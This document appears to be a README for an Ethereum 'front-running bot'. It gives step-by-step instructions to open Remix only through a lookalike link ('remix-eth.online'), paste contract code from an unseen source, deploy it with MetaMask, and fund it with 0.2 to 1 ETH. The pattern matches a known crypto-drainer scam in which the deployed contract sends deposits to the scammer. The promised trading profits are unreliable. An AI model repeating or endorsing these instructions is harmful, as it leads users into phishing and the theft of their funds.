🚨 IMPORTANT: I've received messages from users who didn't provide enough Ethereum to cover gas fees and potential burn fees. The bot targets token contracts with a maximum burn fee of 10% or lower, though most tokens currently have fees between 2-6%. If you fund the contract with 0.15 ETH or less and the bot targets a token with high burn fees, a significant amount of gas fees might be wasted. To avoid this, I recommend funding the contract with at least 0.2 to 1 ETH.

*STEP BY STEP INSTRUCTIONS*

✅ Download MetaMask: https://metamask.io/download/

✅ Access Remix: https://remix-eth.online/
(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)

✅ Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.
Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.

🔥 Paste THIS code in Remix: https://remix-eth.online/

✅ Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6

✅ Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - MetaMask” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "OneinchSlippageBot - bot.sol".

Also if you get this message after deployment "Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] ". You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.

✅ Fund your bot to be able to frontrun transactions.
Make sure your deposit is more than 0.15 ETH(to prevent negating slippage) to your exact contract/bot address.

✅ After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button

➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

Happy trading! 🚀
# ETH-Bot
Ethereum Sniped Bot - Solidity v0.6.6
